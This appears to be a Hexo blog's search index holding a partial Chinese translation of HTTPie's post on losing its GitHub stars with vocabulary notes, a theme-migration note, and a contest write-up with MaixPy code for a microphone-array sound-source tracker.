<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTTPie是如何丢失5.4万Star的</title>
    <url>/trans/how-we-lost-54k-github-stars/</url>
    <content><![CDATA[<div class="note blue anzhiyufont anzhiyu-icon-bullhorn modern"><p>春天快到了！</p>
</div>
<h1>本文章来源背景</h1>
<p>某一天（对就是前几天），我在图书馆搜索关于FastAPI的相关书籍时，找到了《Python FastAPI构建数据科学应用》这本书。该书在2022年5月出的第一版，也是第一次印刷，虽然它已经入住图书馆两年，但好像我是这本书的第一位读者。。。</p>
<img src="https://s2.loli.net/2024/03/19/SzfXyiRWHcs9B7U.png" alt="对就是这本书" style="zoom:50%;" />
<div class="img-alt is-center">对就是这本书。</div>
<p>开始读的时候我才发现，上一句话是有原因的。该书从Python基础讲起，后介绍了FastAPI作为后端框架比较基础的使用模型，在后面几章还有关于NumPy、scikit-learn、OpenCV等与主题不相干的知识（没错、和FastAPI都没有一点关系），但是我找到了一个很有趣的工具——HTTPie。</p>
<p>针对以前做后端接口调试和爬虫请求验证时，我一般使用Postman，但是相对HTTPie来说有些过于繁琐。即使可视化工具很好而且易于使用，但有时也会缺乏一些灵活性，不如命令行工具那么高效。另一方面，cURL是一个非常强大的工具，有数千个选项，但是对于测试简单的REST API而言，可能它会显得非常复杂和冗长。</p>
<p>在搜索相关资料时，我发现HTTPie还有一件“乌龙”事件：54k<span class="emoji" alias="star" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8">⭐</span>在某一夜清零了，作者表示非常懊恼，官方专门写了一篇博客来反思整件事情。本着学习的态度，我决定将原文翻译成中文，并附上一些语言的翻译链接，基于作者不高的翻译水平与空空如也的翻译经验，本篇文章翻译质量可能不及您的预期，如果你想要更为精准、更为流利的翻译请移步👇。</p>
<div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://icloudnative.io/posts/how-we-lost-54k-github-stars/">
    <div class="tag-link-tips">引用站外地址</div>
    <div class="tag-link-bottom">
        <div class="tag-link-left" style="">
          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>
        </div>
        <div class="tag-link-right">
            <div class="tag-link-title">HTTPie 是如何丢失 5.4 万 Star 的</div>
            <div class="tag-link-sitename"> 云原生实验室</div>
        </div>
        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>
    </div>
    </a></div>
<div class="tip sync"><p>官方博客原文链接：<a href="https://httpie.io/blog/stardust">How we lost 54k GitHub stars</a></p>
</div>
<h1>我们是如何损失5.4万star的</h1>
<h2 id="获得5-4万GitHub-stars">获得5.4万GitHub stars</h2>
<p>HTTPie作为一个命令行工具正在庆祝第一次H提交的十周年纪念。</p>
<p>如果你不是非常熟悉本项目，我来向你介绍它：他是一个开源的CLI HTTP客户端。让HTTPie与众不同的是我们从零开始搭建一个让人们用起来非常舒适的API交互终端。</p>
<p>从第一次发布，发表在2012年2月25日的哥本哈根的雨天，我们在GitHub创建了这个项目</p>
<p>我是</p>
<h1>文章部分英文单词</h1>
<p>以下单词来源该博客，音标为英式发音。<a href="https://dictionary.cambridge.org/">https://dictionary.cambridge.org/</a></p>
<details class="folding-tag" ><summary> Copenhagen </summary>
              <div class='content'>
              <p><em><strong>noun</strong></em><br><strong>UK</strong>  /ˌkəʊ.pənˈheɪ.ɡən/ <strong>US</strong>  /ˌkoʊ.pənˈheɪ.ɡən/<br><strong>the capital city of Denmark, situated in the eastern part of the country</strong><br>哥本哈根（丹麦首都，位于丹麦东部）</p>
              </div>
            </details>
<details class="folding-tag" ><summary> proclaim </summary>
              <div class='content'>
              <p><em><strong>verb</strong></em> [ T ]<br><strong>UK</strong>  /prəˈkleɪm/ <strong>US</strong>  /proʊˈkleɪm/<br><strong>to announce something publicly or officially, especially something positive</strong><br>宣布;声明<br><em>All the countries have proclaimed their loyalty to the alliance.</em><br>所有的国家都表明了他们对联盟的忠诚。<br><em>Republican party members were confidently proclaiming victory even as the first few votes came in.</em><br>刚刚得到几张选票，共和党人就准备自信地宣布胜利了。<br><em>[ + that ] It was the famous speech in which he proclaimed that socialism was dead.</em><br>就是在那场著名的演讲中他宣称社会主义已经死亡。<br><em>[ + two objects ] She was proclaimed Queen at the age of 13 after the sudden death of her father.</em><br>父亲突然去世后，她13岁就被立为女王。</p>
              </div>
            </details>
<details class="folding-tag" ><summary> stargazer </summary>
              <div class='content'>
              <p><em><strong>noun</strong></em> [ C ] (also star-gazer, star gazer)<br><strong>UK</strong>  /ˈstɑːˌɡeɪ.zər/ <strong>US</strong>  /ˈstɑːrˌɡeɪ.zɚ/<br><strong>a person who is involved in astronomy or astrology</strong><br>天文学家;占星术士</p><ul><li><em>Environmentalists and stargazers both want dark skies.</em></li><li><em>Star gazers with small telescopes may be able to spot the comet on Monday night.</em></li></ul>
              </div>
            </details>
<details class="folding-tag" ><summary> percentile </summary>
              <div class='content'>
              <p><em><strong>noun</strong></em> [ C ]   MATHEMATICS, SCIENCE   specialized<br><strong>UK</strong>  /pəˈsen.taɪl/ <strong>US</strong>  /pɚˈsen.taɪl/<br><strong>one of the points into which a large range of numbers, results, etc. is divided to make 100 groups of the same size</strong><br>百分位（数）;百分位（数）之一<br><em>That score puts you in the 97th percentile.</em><br>那个分数使你处于百分位排名的第97位。</p>
              </div>
            </details>
<details class="folding-tag" ><summary> magnitude </summary>
              <div class='content'>
              <p><em><strong>noun</strong></em> [ U ]<br><strong>UK</strong>  /ˈmæɡ.nɪ.tʃuːd/ <strong>US</strong>  /ˈmæɡ.nə.tuːd/<br><strong>the large size or importance of something</strong><br>巨大；重大，重要性<br><em>They don’t seem to grasp the magnitude of the problem.</em><br>他们似乎未领会问题的重要性。</p>
              </div>
            </details>
<details class="folding-tag" ><summary> percentile </summary>
              <div class='content'>
              <p><em><strong>noun</strong></em> [ C ]   MATHEMATICS, SCIENCE   specialized<br><strong>UK</strong>  /pəˈsen.taɪl/ <strong>US</strong>  /pɚˈsen.taɪl/<br><strong>one of the points into which a large range of numbers, results, etc. is divided to make 100 groups of the same size</strong><br>百分位（数）;百分位（数）之一<br><em>That score puts you in the 97th percentile.</em><br>那个分数使你处于百分位排名的第97位。</p>
              </div>
            </details>
<details class="folding-tag" ><summary> percentile </summary>
              <div class='content'>
              <p><em><strong>noun</strong></em> [ C ]   MATHEMATICS, SCIENCE   specialized<br><strong>UK</strong>  /pəˈsen.taɪl/ <strong>US</strong>  /pɚˈsen.taɪl/<br><strong>one of the points into which a large range of numbers, results, etc. is divided to make 100 groups of the same size</strong><br>百分位（数）;百分位（数）之一<br><em>That score puts you in the 97th percentile.</em><br>那个分数使你处于百分位排名的第97位。</p>
              </div>
            </details>
]]></content>
      <categories>
        <category>文章翻译</category>
      </categories>
      <tags>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo主题Anzhiyu迁移记录</title>
    <url>/blog/1/</url>
    <content><![CDATA[<p>2024年，是我本科毕业的一年，在我的学业生涯中注定扮演着极其不平凡的一年。回望着四年经历，我有太多太多想说的话，想做的事去为我的本科阶段画上一个圆满的句号。那么，为了迎接我的新生活，我决定重新找回在2021年创立的博客，也就是在我大二时迈入计算机学科的那一刻的初心。</p>
<p>当已经长大两岁的我再回头看自己写的文章百感交集（<s>虽然现在写得也不咋地）</s>，但是我认识到技术一直在进步，时代也一直在发展，没有最好，只有更好。那么，我也想为我的博客做一次更新，作为见证我技术进步最重要的一个地方。</p>
<p>本次博客的主题迁移至Anzhiyu，作者是基于Butterfly主题进行魔改的，我也结合了自己的爱好与一些优秀的博主进行了二次创作，但因为魔改源码需要深入了解代码结构与目录，我耗时两天才完成本次迁移工作，其中大量的文章内容还没有来得及更改请见谅。</p>
<p>最后，很高兴认识你，我是UNOHE。</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>2022大学生电子设计竞赛</title>
    <url>/competition/nuedc_3/</url>
    <content><![CDATA[<p>本次竞赛为2022全国大学生电子设计竞赛E题（TI杯湖北省赛）。小编本科大三在读，电气专业。基础不好，不喜勿喷，感谢访问本网站，如果能给你提供新思路就是我最大的荣幸！</p>
<h2 style="text-align:center;font-weight:700;color:#000">关于题目</h2>
<p>​		设计制作一个声源定位跟踪系统，能够实时显示及指示声源的位置，当声源移动时能够用激光笔动态跟踪声源。 声源检测系统测量区域分布俯视如图 1 所示。</p>
<p><img src="https://s2.loli.net/2023/06/18/sCorxdA1bIMSjEn.jpg" alt="图1 系统测量区域俯视图"></p>
<h3 id="要求">要求</h3>
<ol>
<li>设计并制作声音发生装置——“声源”，装置能独立工作，声音音量手动可调，装置最大边长或直径不超过 10cm，装置可用支架安装，并可在地面移动；声源中心点 B 用红色或其他醒目颜色标识，并在 B 点所在的平面以 B 点为圆心，直径为 5cm 画圆圈，用醒目线条标识，该平面面向检测指示装置（图中 A 点）。（4 分）</li>
<li>设计并制作一个声源定位检测装置，传感器安装在图 1 的 C 区范围内，高度不超过 1m，系统采用的拾音器 或麦克风传感器数量不超过 10 个；在装置上标记测试参考点 A，作为位置坐标的原点；装置上有显示电路，实时显 示 D 区域内声源的位置，显示 A、B 两点直线距离 γ 和以 A 点为原点，AB 在地面的投影与图 1 中心线的夹角 θ， 测量时间不超过 5s，距离 γ 和角度 θ 的测值误差越小越好。（36 分）</li>
<li>设计并制作一个声源指示控制装置，此装置和上述声源定位检测装置可以合为一体。也放置在图 1 的 C 区， 安装有激光笔和二维电动云台，能控制激光笔指向声源，定位计算过程中时，激光笔关闭，定位运算完成时激光笔 开启。定位指示声源时，动作反应时间不超过 10s，光点与 B 点偏差越小越好。（30 分）</li>
<li>声源移动动态追踪：当声源摆放在地面，用细绳牵引，以 0.2m/s 左右的速度在 D 区移动时，激光笔光点指 向 B 点，光点与 B 点偏差越小好，跟踪反应时间越短越好。（20 分）</li>
</ol>
<h2 style="text-align:center;font-weight:700;color:#000">解题过程</h2>
<p>听说Sipeed的MIC阵列模块可以秒杀E题？<a href="https://wiki.sipeed.com/hardware/zh/modules/micarray.html">MicArray 麦克风阵列 - Sipeed Wiki</a></p>
<p>图2所示的麦克风阵列模块是 Sipeed 基于 MSM261S4030H0 数字麦克风芯片设计的，模块声音识别灵敏度、信噪比高，由沿板的六个麦克风和一个中心的麦克风组成，阵列板上的 12 颗 LED 可以用来可视化识别声源方位，基于 <code>GCC-PHAT</code> 算法实现声源定位、语音识别、波束成形等需求场合。</p>
<p><img src="https://wiki.sipeed.com/hardware/assets/spmod/spmod_micarray/spmod_micarray.png" alt="图2 MicArray 麦克风阵列"></p>
<p>对就是这个<span class="emoji" alias="anguished" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f627.png?v8">😧</span></p>
<h4 id="相关参数">相关参数</h4>
<table>
<thead>
<tr>
  <th>功能特点</th>
  <th>参数</th>
</tr>
</thead>
<tbody>
<tr>
  <td>声压级</td>
  <td>140 dB SPL</td>
</tr>
<tr>
  <td>灵敏度</td>
  <td>-26(dB,dBFS @1kHz 1Pa)</td>
</tr>
<tr>
  <td>信噪比</td>
  <td>57 dB (20kHz bandwidth,A-weighted) <br>THD&lt;1% (100dB SPL @1kHz S=Nom,Rload&gt;2k )</td>
</tr>
<tr>
  <td>时钟频率</td>
  <td>1.0-4.0Mhz(正常模式) <br>150-800khz(低功耗模式)</td>
</tr>
<tr>
  <td>MEMS 麦克风</td>
  <td>7 个 MSM261S4030H0 组成阵列</td>
</tr>
<tr>
  <td>连接器</td>
  <td>支持 2*5P 2.54mm 端子和 10P 0.5mm FPC 连接器</td>
</tr>
<tr>
  <td>灯光</td>
  <td>12 个 SK9822 LED 组成一个环形 LED 阵列</td>
</tr>
<tr>
  <td></td>
  <td>多个 LED 通过双信号线级联 / 8 Bit（256 级）可调颜色 / 5 Bit（32 级）亮度调节</td>
</tr>
<tr>
  <td>尺寸</td>
  <td>78.1*88.8mm</td>
</tr>
</tbody>
</table>
<p>与此同时，需要注意的是网络上有许多卖麦克风阵列的商家，不同商家卖的产品接口可能不相同，在购买或使用前一定要阅读产品的文档！</p>
<p>因为我买的是官方的产品，所以直接按照官方提供的代码逻辑套用即可。包括官方还给了一个2022年电赛E题声源定位跟踪系统做好的链接。。。我照着完善了一下代码框架，接上线后阵列模块非常容易受干扰（当然可以通过选择音源提高效果），需要进行一些处理。</p>
<p>下面是官方调用函数：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Maix <span class="token keyword">import</span> MIC_ARRAY <span class="token keyword">as</span> mic
<span class="token keyword">import</span> lcd

lcd<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>
mic<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#默认配置</span>
<span class="token comment">#mic.init(i2s_d0=23, i2s_d1=22, i2s_d2=21, i2s_d3=20, i2s_ws=19, i2s_sclk=18, sk9822_dat=24, sk9822_clk=25)#可自定义配置 IO</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    imga <span class="token operator">=</span> mic<span class="token punctuation">.</span>get_map<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 获取声音源分布图像</span>
    b <span class="token operator">=</span> mic<span class="token punctuation">.</span>get_dir<span class="token punctuation">(</span>imga<span class="token punctuation">)</span>   <span class="token comment"># 计算、获取声源方向</span>
    a <span class="token operator">=</span> mic<span class="token punctuation">.</span>set_led<span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 配置 RGB LED 颜色值</span>
    imgb <span class="token operator">=</span> imga<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span>
    imgc <span class="token operator">=</span> imgb<span class="token punctuation">.</span>to_rainbow<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 将图像转换为彩虹图像</span>
    a <span class="token operator">=</span> lcd<span class="token punctuation">.</span>display<span class="token punctuation">(</span>imgc<span class="token punctuation">)</span>
mic<span class="token punctuation">.</span>deinit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>下面是最终的完整代码：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Maix <span class="token keyword">import</span> MIC_ARRAY <span class="token keyword">as</span> mic
<span class="token keyword">import</span> lcd<span class="token punctuation">,</span> image
<span class="token keyword">import</span> time
<span class="token keyword">import</span> math
<span class="token keyword">from</span> Maix <span class="token keyword">import</span> GPIO
<span class="token keyword">from</span> fpioa_manager <span class="token keyword">import</span> fm
<span class="token keyword">from</span> machine <span class="token keyword">import</span> Timer<span class="token punctuation">,</span> PWM

<span class="token comment"># MIC-IO</span>
mic<span class="token punctuation">.</span>init<span class="token punctuation">(</span>i2s_d0<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span> i2s_d1<span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">,</span> i2s_d2<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">,</span> i2s_d3<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">,</span> i2s_ws<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">,</span> i2s_sclk<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> sk9822_dat<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span> sk9822_clk<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>
<span class="token comment"># Laser-IO</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>GPIO0<span class="token punctuation">)</span>
Laser <span class="token operator">=</span> GPIO<span class="token punctuation">(</span>GPIO<span class="token punctuation">.</span>GPIO0<span class="token punctuation">,</span> GPIO<span class="token punctuation">.</span>OUT<span class="token punctuation">)</span>
<span class="token comment"># KEY-IO</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>GPIO1<span class="token punctuation">)</span>
KG0 <span class="token operator">=</span> GPIO<span class="token punctuation">(</span>GPIO<span class="token punctuation">.</span>GPIO1<span class="token punctuation">,</span> GPIO<span class="token punctuation">.</span>IN<span class="token punctuation">,</span> GPIO<span class="token punctuation">.</span>PULL_DOWN<span class="token punctuation">)</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>GPIO2<span class="token punctuation">)</span>
KG1 <span class="token operator">=</span> GPIO<span class="token punctuation">(</span>GPIO<span class="token punctuation">.</span>GPIO2<span class="token punctuation">,</span> GPIO<span class="token punctuation">.</span>IN<span class="token punctuation">,</span> GPIO<span class="token punctuation">.</span>PULL_DOWN<span class="token punctuation">)</span>
<span class="token comment"># SERVO-IO</span>
tim <span class="token operator">=</span> Timer<span class="token punctuation">(</span>Timer<span class="token punctuation">.</span>TIMER0<span class="token punctuation">,</span> Timer<span class="token punctuation">.</span>CHANNEL0<span class="token punctuation">,</span> mode<span class="token operator">=</span>Timer<span class="token punctuation">.</span>MODE_PWM<span class="token punctuation">)</span>
Servo_laser <span class="token operator">=</span> PWM<span class="token punctuation">(</span>tim<span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> duty<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> pin<span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">)</span>
<span class="token comment"># LCD-INIT-320*240 and MAP-INIT</span>
lcd<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>
lcd<span class="token punctuation">.</span>fill_rectangle<span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 上边线</span>
lcd<span class="token punctuation">.</span>fill_rectangle<span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 左边线</span>
lcd<span class="token punctuation">.</span>fill_rectangle<span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 下边线</span>
lcd<span class="token punctuation">.</span>fill_rectangle<span class="token punctuation">(</span><span class="token number">276</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 右边线</span>
lcd<span class="token punctuation">.</span>fill_rectangle<span class="token punctuation">(</span><span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 右边线2</span>
lcd<span class="token punctuation">.</span>fill_rectangle<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 左区域上边线</span>
lcd<span class="token punctuation">.</span>fill_rectangle<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 左区域下边线</span>
lcd<span class="token punctuation">.</span>fill_rectangle<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 左区域左边线</span>


<span class="token keyword">class</span> <span class="token class-name">Argument</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Some Argus"""</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span>Argument<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># Normal</span>
        self<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>num2 <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>Angle_LB <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>t <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>t1 <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>t2 <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>maxnum <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>minnum <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>jiaodu <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>Angle_last <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>i <span class="token operator">=</span> <span class="token number">100</span>
        self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>times <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>pid <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>err <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>JD <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>output <span class="token operator">=</span> <span class="token number">0</span>

        <span class="token comment"># Kalman Filter</span>
        self<span class="token punctuation">.</span>KF_lastP <span class="token operator">=</span> <span class="token number">0.1</span>  <span class="token comment"># 上次的协方差</span>
        self<span class="token punctuation">.</span>KF_nowP <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本次的协方差</span>
        self<span class="token punctuation">.</span>KF_x_hat <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 卡尔曼滤波的计算值，即为后验最优值</span>
        self<span class="token punctuation">.</span>KF_Kg <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 卡尔曼增益系数</span>
        self<span class="token punctuation">.</span>KF_Q <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 过程噪声</span>
        self<span class="token punctuation">.</span>KF_R <span class="token operator">=</span> <span class="token number">0.01</span>  <span class="token comment"># 测量噪声</span>


arguments <span class="token operator">=</span> Argument<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">kalman_filter</span><span class="token punctuation">(</span>argus<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    argus<span class="token punctuation">.</span>output <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># output为卡尔曼滤波计算值</span>
    x_t <span class="token operator">=</span> argus<span class="token punctuation">.</span>KF_x_hat  <span class="token comment"># 当前先验预测值 = 上一次最优值</span>
    argus<span class="token punctuation">.</span>KF_nowP <span class="token operator">=</span> argus<span class="token punctuation">.</span>KF_lastP <span class="token operator">+</span> argus<span class="token punctuation">.</span>KF_Q  <span class="token comment"># 本次的协方差矩阵</span>
    argus<span class="token punctuation">.</span>KF_Kg <span class="token operator">=</span> argus<span class="token punctuation">.</span>KF_nowP <span class="token operator">/</span> <span class="token punctuation">(</span>argus<span class="token punctuation">.</span>KF_nowP <span class="token operator">+</span> argus<span class="token punctuation">.</span>KF_R<span class="token punctuation">)</span>  <span class="token comment"># 卡尔曼增益系数计算</span>
    argus<span class="token punctuation">.</span>output <span class="token operator">=</span> x_t <span class="token operator">+</span> argus<span class="token punctuation">.</span>KF_Kg <span class="token operator">*</span> <span class="token punctuation">(</span>value <span class="token operator">-</span> x_t<span class="token punctuation">)</span>  <span class="token comment"># 当前最优值</span>
    argus<span class="token punctuation">.</span>KF_x_hat <span class="token operator">=</span> argus<span class="token punctuation">.</span>output  <span class="token comment"># 更新最优值</span>
    argus<span class="token punctuation">.</span>KF_lastP <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> argus<span class="token punctuation">.</span>KF_Kg<span class="token punctuation">)</span> <span class="token operator">*</span> argus<span class="token punctuation">.</span>KF_nowP  <span class="token comment"># 更新协方差矩阵</span>


<span class="token keyword">def</span> <span class="token function">servo</span><span class="token punctuation">(</span>servo_inter<span class="token punctuation">,</span> angle<span class="token punctuation">)</span><span class="token punctuation">:</span>
    servo_inter<span class="token punctuation">.</span>duty<span class="token punctuation">(</span><span class="token punctuation">(</span>angle <span class="token operator">+</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">180</span> <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">2.5</span><span class="token punctuation">)</span>


<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token comment"># Inner Params: [AngleX, AngleY, AngleR, Angle, AngleAddPi]</span>
    angle_params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token comment"># MIC-Detecting</span>
    img_a <span class="token operator">=</span> mic<span class="token punctuation">.</span>get_map<span class="token punctuation">(</span><span class="token punctuation">)</span>
    img_b <span class="token operator">=</span> mic<span class="token punctuation">.</span>get_dir<span class="token punctuation">(</span>img_a<span class="token punctuation">)</span>
